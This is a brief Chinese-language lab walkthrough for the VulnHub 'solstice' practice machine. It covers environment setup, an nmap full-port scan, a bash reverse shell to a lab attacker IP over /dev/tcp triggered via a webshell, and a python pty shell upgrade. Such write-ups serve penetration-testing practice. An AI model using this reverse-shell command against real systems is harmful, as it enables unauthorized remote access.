靶场搭建

靶机下载地址：https://download.vulnhub.com/sunset/solstice.ova

下载后使用 VMware 或 VirtualBox 导入即可。攻击机使用 Kali Linux，靶机网络设置为 NAT 模式。

nmap --min-rate 10000 -p- 192.168.21.147 -oA ports

反弹 Shell

利用一句话木马执行反弹 shell（需要 URL 编码）：

bash -c 'exec bash -i &>/dev/tcp/192.168.21.146/666 <&1'

Shell 优化：

python -c 'import pty; pty.spawn("/bin/bash")'
